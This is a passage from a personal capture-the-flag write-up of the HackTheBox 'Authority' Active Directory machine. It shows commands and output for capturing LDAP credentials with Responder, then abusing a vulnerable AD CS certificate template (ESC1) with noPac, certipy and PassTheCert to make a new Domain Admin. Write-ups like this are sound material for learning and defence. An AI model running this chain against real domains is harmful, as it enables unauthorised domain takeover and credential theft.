![15e799813f50fe2e3506e88fa3c22855.png](../../../_resources/15e799813f50fe2e3506e88fa3c22855.png)

Pointing to my listening Responder and saving the config, then lastly testing the connection should talk back to my responder... But it's not working so Instead I just added a secundary string on the default connection profile like so:

![6a545fdbc8bdc832fccade9974bb936c.png](../../../_resources/6a545fdbc8bdc832fccade9974bb936c.png)

And by clicking on "Test LDAP profile":

```Bash
[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.4]
    Responder IPv6             [dead:beef:2::1002]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-A6GHM39T93I]
    Responder Domain Name      [9YV3.LOCAL]
    Responder DCE-RPC Port     [49204]

[+] Listening for events...

[*] Skipping one character username: 



[LDAP] Cleartext Client   : 10.10.11.222
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
[*] Skipping previously captured cleartext password for CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
```

Good now we have our first LDAP credentials!

Let's try to see if we can get our first flag:

![a1cb6b194ce8ffa7513b7aa058749cdb.png](../../../_resources/a1cb6b194ce8ffa7513b7aa058749cdb.png)

Let's go! let's check if we can find the user.txt?

![0da0d2b73e1acdc5ba325122f9dc018f.png](../../../_resources/0da0d2b73e1acdc5ba325122f9dc018f.png)

* * *

## PWN the Domain:

Now that we have our first user with a shell access we shall see what can we do to escalate to Administrator or even further PWN the Domain!

Checking manually for Permissions we can see that svc_ldap can add Workstations to Domain:

```Bash
*Evil-WinRM* PS C:\Users\svc_ldap\Desktop> whoami /all

USER INFORMATION
----------------

User Name    SID
============ =============================================
htb\svc_ldap S-1-5-21-622327497-3269355298-2248959698-1601


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

Looking around we can find a LDAPs certificate:

```Bash
*Evil-WinRM* PS C:\Certs> ls


    Directory: C:\Certs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/23/2023   6:11 PM           4933 LDAPs.pfx
```

All those shares are void:

```Bash
*Evil-WinRM* PS C:\Department Shares> ls


    Directory: C:\Department Shares


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/28/2023   1:59 PM                Accounting
d-----        3/28/2023   1:57 PM                Finance
d-----        3/28/2023   1:57 PM                HR
d-----        3/28/2023   1:57 PM                IT
d-----        3/28/2023   1:57 PM                Marketing
d-----        3/28/2023   1:57 PM                Operations
d-----        3/28/2023   1:57 PM                R&D
d-----        3/28/2023   1:58 PM                Sales
```

On the machine are available only Administrator and not much more, so from now on i will upload Sharphound and check what other hidden permissions can I get from AD!

```Bash
*Evil-WinRM* PS C:\TEMP> ./Sharphound.exe
2023-07-16T14:15:05.0459322-04:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2023-07-16T14:15:05.2021808-04:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-07-16T14:15:05.2334321-04:00|INFORMATION|Initializing SharpHound at 2:15 PM on 7/16/2023
2023-07-16T14:15:05.4522056-04:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-07-16T14:15:05.7021849-04:00|INFORMATION|Beginning LDAP search for authority.htb
2023-07-16T14:15:05.7646971-04:00|INFORMATION|Producer has finished, closing LDAP channel
2023-07-16T14:15:05.7646971-04:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-07-16T14:15:36.2959592-04:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 35 MB RAM
2023-07-16T14:15:53.5927999-04:00|INFORMATION|Consumers finished, closing output channel
2023-07-16T14:15:53.6396765-04:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2023-07-16T14:15:53.8740594-04:00|INFORMATION|Status: 93 objects finished (+93 1.9375)/s -- Using 42 MB RAM
2023-07-16T14:15:53.8740594-04:00|INFORMATION|Enumeration finished in 00:00:48.1879048
2023-07-16T14:15:53.9521768-04:00|INFORMATION|Saving cache with stats: 53 ID to type mappings.
 54 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2023-07-16T14:15:53.9678001-04:00|INFORMATION|SharpHound Enumeration Completed at 2:15 PM on 7/16/2023! Happy Graphing!
```

Now here Seems like the machine we are connected to have DC-SYNC rights on the "Father" domain: authority.htb

Now running crackmapexec with LDAP shows us that a ADCS is available on the machine:

```Bash
┌──(root㉿kali-linux)-[/home/millycash/Downloads/Exploits/noPac]
└─# crackmapexec ldap authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -M adcs      
SMB         authority.htb   445    AUTHORITY        [*] Windows 10.0 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
LDAPS       authority.htb   636    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
ADCS                                                Found PKI Enrollment Server: authority.authority.htb
ADCS                                                Found CN: AUTHORITY-CA
```

Since we can't a DCSync or dump passwords from LSASS on the machine I guess we have to use that pfx found in Root C disk to elevate to Global Admin.

First let's see what is this certificate about , and if we have access to it with the password from Ansible folder: Seems no so I will doenload the pdf and crack it with john!

```Bash
┌──(root㉿kali-linux)-[/home/millycash/Downloads/authority.htb]
└─# john LDAPS.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:13 16.25% (ETA: 17:09:44) 0g/s 195676p/s 195676c/s 195676C/s yuwieshan..yuniman
0g 0:00:00:16 20.37% (ETA: 17:09:43) 0g/s 195339p/s 195339c/s 195339C/s tonyrod1..tonka8
0g 0:00:00:49 60.95% (ETA: 17:09:45) 0g/s 179111p/s 179111c/s 179111C/s danutza82..danny987
0g 0:00:01:20 DONE (2023-07-16 17:09) 0g/s 178753p/s 178753c/s 178753C/s !Cjug6A8k!..*7¡Vamos!
Session completed.
```

Umh can't crack the password. So I moved forward and following this guide: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#abuse

I tried to enumerate the ADCS locally from Linux but it's throwing an error:

![210df5e267bac86f87465704cacefb82.png](../../../_resources/210df5e267bac86f87465704cacefb82.png)

So I uploaded the Windows variand called certify.exe and I can see some Cert templates that are Vulnerable:

```Bash
*Evil-WinRM* PS C:\temp> ./certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=authority,DC=htb'

[*] Listing info about the Enterprise CA 'AUTHORITY-CA'

    Enterprise CA Name            : AUTHORITY-CA
    DNS Hostname                  : authority.authority.htb
    FullName                      : authority.authority.htb\AUTHORITY-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=AUTHORITY-CA, DC=authority, DC=htb
    Cert Thumbprint               : 42A80DC79DD9CE76D032080B2F8B172BC29B0182
    Cert Serial                   : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Cert Start Date               : 4/23/2023 9:46:26 PM
    Cert End Date                 : 4/23/2123 9:56:25 PM
    Cert Chain                    : CN=AUTHORITY-CA,DC=authority,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
      Allow  ManageCA, ManageCertificates               HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : authority.authority.htb\AUTHORITY-CA
    Template Name                         : CorpVPN
    Schema Version                        : 2
    Validity Period                       : 20 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Document Signing, Encrypting File System, IP security IKE intermediate, IP security user, KDC Authentication, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Document Signing, Encrypting File System, IP security IKE intermediate, IP security user, KDC Authentication, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Domain Computers          S-1-5-21-622327497-3269355298-2248959698-515
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
      Object Control Permissions
        Owner                       : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
        WriteOwner Principals       : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
        WriteDacl Principals        : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519
        WriteProperty Principals    : HTB\Administrator             S-1-5-21-622327497-3269355298-2248959698-500
                                      HTB\Domain Admins             S-1-5-21-622327497-3269355298-2248959698-512
                                      HTB\Enterprise Admins         S-1-5-21-622327497-3269355298-2248959698-519



Certify completed in 00:00:10.0383584
```

Now that we have all those informations I think we could use this one to obtain Global Admin: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#misconfigured-certificate-templates-esc1

Umh seems like we can't enroll the certificate?

```bash
*Evil-WinRM* PS C:\temp> ./Certify.exe request /ca:authority.authority.htb\AUTHORITY-CA /template:CorpVPN /altname:authority.htb\Administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : HTB\svc_ldap
[*] No subject name specified, using current context as subject.

[*] Template                : CorpVPN
[*] Subject                 : CN=svc_ldap, OU=Service Accounts, OU=CORP, DC=authority, DC=htb
[*] AltName                 : authority.htb\Administrator

[*] Certificate Authority   : authority.authority.htb\AUTHORITY-CA

[!] CA Response             : The submission failed: Denied by Policy Module
[!] Last status             : 0x80094012. Message: The permissions on the certificate template do not allow the current user to enroll for this type of certificate. (Exception from HRESULT: 0x80094012)
[*] Request ID              : 2

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA1Pmyjydxa42Y6PsiYeK6I0hpL8b+CSOK9RrpWJ/MrQ23x1ul
yqsMJ2lYL8wPUUsVw+JK38Ob9VNCMcZjQlLJ+6IOfNJqdYqYnlFEvlov0mqC9pdI
eoWhyxkJYG3BZGNFKxAOTU60cpoDxOVlfTGMZU0zu9EM9GDUhplafs19f8r3LD86
DZsgpfNodIn8BVER2pVwoa+9WuJ4ym73m8tqGdXFAQLCTUh4bfcsnoy3VSgCP5mn
p01TDHcY9aMcLxcXoOavOr+J80S+xxcVbaV019Ew3VSUnLxbGFGPk15hEHkm2lqe
tjF9shFueZpqaXXOshFDhpihqhB+PCasquRMJQIDAQABAoIBACWk/SrQjfu0y5Ji
0XD74mraIb2QLtbusWEhoJ1JoaP1CMb0LBnmof9VX4ETUKHN48r79MAYkziJvumN
Z34RpCIWQvlNOAQOu2tAciYzSsCmkv+DPgxqEm8TvdSNkeFsqo0yCVUg1ERtdL0Y
zxeR6n79ZmeMS/3mH6qq8JP5PnWX1/oYcDu2PqvaU39MMZIA+DCX9lN78FnZiMLo
Fv/OUm/OTF+9TT69deJ/BgQ1bbZBN7N8GRTRc46OH02svPFeCGB+Yo1WWdFrByUK
bElFafmPm7ArLnVSCo9lUAfYSntCHWtjNTh5C0LHM2rjQw7PAwB+9160CTM4KeOY
WyUcpwECgYEA386+hKb4MV67cdwWJ0nNiKdazSRgjNobgWT6wQ/kqRGnxrgq0y9e
qIxA622EyKKY9KwB4JQviTbOH5XzoAB5vmkuhUl2++rNXDFre8Z8i+XsIDJMVL17
hdZQj4rRbbUmXL7ZMf3plNPCYlnDny9viYTYGvVYUX2cUk6SS4bNhjMCgYEA85wU
SAyuX6yAHDeTSAsEBJGicQbOZcRywQWcqDp1M6MJTeLLn//5nxZJ3h1UnocXOxX7
63lszsjkx0G3vJPaTe9v9sQuOx79NPhJoEogtKLVCZnodOZQZMi5ll9ZoOQ9B1V7
C+5rL63P+KF1mggfVc5q10r89MlrCsjBqr5vnEcCgYA1LLbhZ5ZijIJ2q/brgMJ/
rFuLkBAMhymv1aEqS69laBd3xHwQTxnra99k0FGTJea3g0Ky7CJbNJVGteb7ZgGG
9xChhHHrqr7+H5PNBbzDtG4kvC6cl6SIiQH9CNt3eGnT8VhDY3Oi86kkmvU6lhen
EdQSm6ZPPkvs1lQ186JTNwKBgQCDLmoxfjqsJHz8NOUnp17rgu0BhlPAs2/EB1yb
rpcMTmAlQ9q49yOZimwOoqa9kytsUuNMox93nvCrZ/UkJE4rJ6OYM35dsctSKd2j
5icEfqbPu8RUpu1lyD0//2qJXD6M43gWLbYkf6l9TpzAbF1LXJNmCeh7fLcaoI7B
fjkl4wKBgQCfFEiV5G6b9QafWd2bsDc3bc4G3KYQ5eYYgOHQaA4pu5+lC64NEaIm
eyd2l6S0AwkBFXdxeop04spm0070m5s0haHuC9MBH2OcZsS8PR4uYUxIJ2B7bz74
eq6nBkxvY+LKbtsOuk6BMAtKe54RuEfbcTlpMQvgGB8L0fDcFpsbaw==
-----END RSA PRIVATE KEY-----

[X] Error downloading certificate: Cert not yet issued yet! (iDisposition: 2)

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

So now I google a bit and I found this one: https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4

1.  We have a Vulnerable Template that can be used as Domain takeover but svc_ldaps have no access to it.
2.  The Vulnerable template is enrollable by Domain Admins, Ent Admins and Domain Computer
3.  The svc_ldaps have permission to join a pc to domain

The solution to this problem would be:

1.  Use certipy with svc_ldaps do add a fake computer object
2.  Use that object obtained from step 2 to request a new cerificate with the vulnerable account
3.  Impersonate and profil.

So let's try:

1.  First I will add a new Computer object: https://tools.thehacker.recipes/impacket/examples/addcomputer.py  Here I couldn't make to work impacketer so I used noPAC to create a computer object ah
    
    ```Bash
    ┌──(root㉿kali-linux)-[/home/millycash/Downloads/Exploits/noPac]
    └─# sudo python3 noPac.py authority.htb/svc_ldap:lDaP_1n_th3_cle4r! -dc-ip 10.10.11.222  -shell --impersonate authority.htb\Administrator
    
    ███    ██  ██████  ██████   █████   ██████ 
    ████   ██ ██    ██ ██   ██ ██   ██ ██      
    ██ ██  ██ ██    ██ ██████  ███████ ██      
    ██  ██ ██ ██    ██ ██      ██   ██ ██      
    ██   ████  ██████  ██      ██   ██  ██████ 
        
    [*] Current ms-DS-MachineAccountQuota = 10
    [*] Selected Target authority.authority.htb
    [*] will try to impersonate authority.htbAdministrator
    [*] Adding Computer Account "WIN-QBCXG9MRPG6$"
    [*] MachineAccount "WIN-QBCXG9MRPG6$" password = 6ZzVXMveOVRE
    [*] Successfully added machine account WIN-QBCXG9MRPG6$ with password 6ZzVXMveOVRE.
    [*] WIN-QBCXG9MRPG6$ object = CN=WIN-QBCXG9MRPG6,CN=Computers,DC=authority,DC=htb
    [-] Cannot rename the machine account , Reason 00000523: SysErr: DSID-031A1242, problem 22 (Invalid argument), data 0
    
    [*] Attempting to del a computer with the name: WIN-QBCXG9MRPG6$
    [-] Delete computer WIN-QBCXG9MRPG6$ Failed! Maybe the current user does not have permission.
    ```
    
2.  We have a PC name and the password so let's chack that is available:
    
    ```Bash
    pwdlastset             : 12/31/1600 7:00:00 PM
    logoncount             : 0
    badpasswordtime        : 12/31/1600 7:00:00 PM
    distinguishedname      : CN=WIN-QBCXG9MRPG6,CN=Computers,DC=authority,DC=htb
    objectclass            : {top, person, organizationalPerson, user...}
    name                   : WIN-QBCXG9MRPG6
    objectsid              : S-1-5-21-622327497-3269355298-2248959698-11604
    samaccountname         : WIN-QBCXG9MRPG6$
    localpolicyflags       : 0
    codepage               : 0
    samaccounttype         : MACHINE_ACCOUNT
    accountexpires         : NEVER
    countrycode            : 0
    whenchanged            : 7/16/2023 10:47:04 PM
    instancetype           : 4
    usncreated             : 266659
    objectguid             : e62a8edb-83a9-4085-bc97-e05591b2dbe5
    lastlogon              : 12/31/1600 7:00:00 PM
    lastlogoff             : 12/31/1600 7:00:00 PM
    objectcategory         : CN=Computer,CN=Schema,CN=Configuration,DC=authority,DC=htb
    dscorepropagationdata  : 1/1/1601 12:00:00 AM
    ms-ds-creatorsid       : {1, 5, 0, 0...}
    badpwdcount            : 0
    cn                     : WIN-QBCXG9MRPG6
    useraccountcontrol     : WORKSTATION_TRUST_ACCOUNT
    whencreated            : 7/16/2023 10:47:04 PM
    primarygroupid         : 515
    iscriticalsystemobject : False
    usnchanged             : 266663
    ```
    
3.  Good it's there. now we should be able to request a PFX on behalf of it:
    
    ```Bash
    ┌──(root㉿kali-linux)-[/home/millycash/Downloads/Exploits/noPac]
    └─# certipy req -username 'WIN-X5CX7E0M4UE$' -password 'Cd&cSO4#Ef@1' -ca 'AUTHORITY-CA' -target 'authority.authority.htb' -template 'CorpVPN' 
    Certipy v4.3.0 - by Oliver Lyak (ly4k)
    
    [*] Requesting certificate via RPC
    [*] Successfully requested certificate
    [*] Request ID is 6
    [*] Got certificate without identification
    [*] Certificate has no object SID
    [*] Saved certificate and private key to 'win-x5cx7e0m4ue.pfx'
    ```
    
4.  We can eventually generate the certificate with Impersonation as Administrator, see the -upn:
    
    ```Bash
    ┌──(root㉿kali-linux)-[/home/millycash/Downloads/authority.htb]
    └─# certipy req -username 'WIN-WGU2MJSYTFR$' -password 'iZcHaTPFByEI' -ca 'AUTHORITY-CA' -target 'authority.authority.htb' -template 'CorpVPN' -upn 'Administrator'
    Certipy v4.3.0 - by Oliver Lyak (ly4k)
    
    [*] Requesting certificate via RPC
    [*] Successfully requested certificate
    [*] Request ID is 9
    [*] Got certificate with UPN 'Administrator'
    [*] Certificate has no object SID
    [*] Saved certificate and private key to 'administrator.pfx'
    ```
    
5.  But even trying directly from WIN-RM session i get same error:
    
    ```Bash
    *Evil-WinRM* PS C:\TEMP> ./Rubeus.exe asktgt  /user:Administrator /certificate:C:\temp\administrator.pfx
    
       ______        _
      (_____ \      | |
       _____) )_   _| |__  _____ _   _  ___
      |  __  /| | | |  _ \| ___ | | | |/___)
      | |  \ \| |_| | |_) ) ____| |_| |___ |
      |_|   |_|____/|____/|_____)____/(___/
    
      v2.2.0
    
    [*] Action: Ask TGT
    
    [*] Using PKINIT with etype rc4_hmac and subject: CN=Win-cue6dvjcf97$
    [*] Building AS-REQ (w/ PKINIT preauth) for: 'authority.htb\Administrator'
    [*] Using domain controller: fe80::9f8c:1665:6894:9d4f%8:88
    
    [X] KRB-ERROR (16) : KDC_ERR_PADATA_TYPE_NOSUPP
    
    *Evil-WinRM* PS C:\TEMP>
    ```
    
6.  Checking the error that means that PKINIT is not configured on the DC(https://github.com/ly4k/Certipy/issues/51): ![4e593326bb64a0d0faf5895ab55aefff.png](../../../_resources/4e593326bb64a0d0faf5895ab55aefff.png)
    

Then looking around here seems like Ceripy tool integrated a DNS option to set the dnshostname same as the DC:

![2f1146897872702fc7dd7d4c8bbfece7.png](../../../_resources/2f1146897872702fc7dd7d4c8bbfece7.png)

Here is the explanation:

```Text
So during PKINIT Kerberos authentication, we supply a principal name (e.g. johnpc$@corp.local) and a certificate with a DNSName set to johnpc.corp.local. The KDC then looks up the account from the principal name. Since johnpc$ is a computer account, the KDC then splits the DNSName field into a computer name and realm part. The KDC then validates that the computer name part matches the sAMAccountName terminated with $ and that the realm part matches the domain. If both parts match, the validation is a success, and the mapping is thus valid. It is worth noting that the dNSHostName property of the account is not used for the certificate mapping. The dNSHostName property is only used when the certificate is requested.
```

Firstly I tried to use the linked version with BloodyAD and RBDC but I can't get it working: https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html

So I stumbled upon this: https://github.com/AlmondOffSec/PassTheCert/tree/main/Python

1.  Firstly I divice the pfx from it's priv key and certificate:
    
    ```Bash
    ┌──(root㉿kali-linux)-[/home/millycash/Downloads/authority.htb]
    └─# certipy cert -pfx administrator_authority.pfx -nokey -out administrator.crt
    Certipy v4.3.0 - by Oliver Lyak (ly4k)
    
    [*] Writing certificate and  to 'administrator.crt'
                                                                                                                                                                  
    ┌──(root㉿kali-linux)-[/home/millycash/Downloads/authority.htb]
    └─# certipy cert -pfx administrator_authority.pfx -nocert -out administrator.key
    Certipy v4.3.0 - by Oliver Lyak (ly4k)
    
    [*] Writing private key to 'administrator.key'
    ```
    
2.  Then I use the passtheticket.py interactive shell to gain a shell via DC:
    
    ```bash
    ┌──(root㉿kali-linux)-[/home/millycash/Downloads/authority.htb]
    └─# python3 ../PassTheCert/Python/passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222
    Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
    
    Type help for list of commands
    
    # help
    
     add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
     rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
     add_user new_user [parent] - Creates a new user.
     add_user_to_group user group - Adds a user to a group.
     change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
     clear_rbcd target - Clear the resource based constrained delegation configuration information.
     disable_account user - Disable the user's account.
     enable_account user - Enable the user's account.
     dump - Dumps the domain.
     search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
     get_user_groups user - Retrieves all groups this user is a member of.
     get_group_users group - Retrieves all members of a group.
     get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
     grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
     set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
     set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
     start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
     write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
     exit - Terminates this session.
    
    #
    ```
    
3.  Then we add a new user to Domain Admins group:
    
    ```Bash
    # add_user yovecio2
    Attempting to create user in: %s CN=Users,DC=authority,DC=htb
    Adding new user with username: yovecio2 and password: 0I#rZ1%4SJ=tk37 result: OK
    
    # add_user_to_group yovecio2 'Domain Admins'
    Adding user: yovecio2 to group Domain Admins result: OK
    ```
    
4.  Lastly we login via Evil-winm and grab the root.txt flag:
    
    ```Bash
    c*Evil-WinRM* PS C:\Users\Administrator> cd Dektop
    *Evil-WinRM* PS C:\Users\Administrator\Desktop> ls
    
    
        Directory: C:\Users\Administrator\Desktop
    
    
    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    -ar---        7/13/2023   1:01 PM             34 root.txt
    ```
    

* * *

## Post Analysys:

From what I've seen seems like lastest version of Certipy suports SCHANNEL and LDAP-SHELL which avoids us the need to use passthecertificate.py:

```Bash
┌──(root㉿kali-linux)-[/home/millycash/Downloads/authority.htb]
└─# certipy auth -pfx administrator_authority.pfx -dc-ip 10.10.11.222 -ldap-shell                               
Certipy v4.5.1 - by Oliver Lyak (ly4k)

[*] Connecting to 'ldap://10.10.11.222:389'
[-] Got error: LDAPInvalidCredentialsResult - 49 - invalidCredentials - None - 80090317: LdapErr: DSID-0C090635, comment: The server did not receive any credentials via TLS, data 0, v4563 - bindResponse - None
[-] Use -debug to print a stacktrace
```

Unfortunately i seems not be able to make it work anyway... I guess something is off with latest version of Certipy, I may test it on work PC with an older version anyway.

Next day I tried with several other versions but the result was same which lead me toward the conclusipon that it must be a bug in Certipy:

https://github.com/ly4k/Certipy/issues/144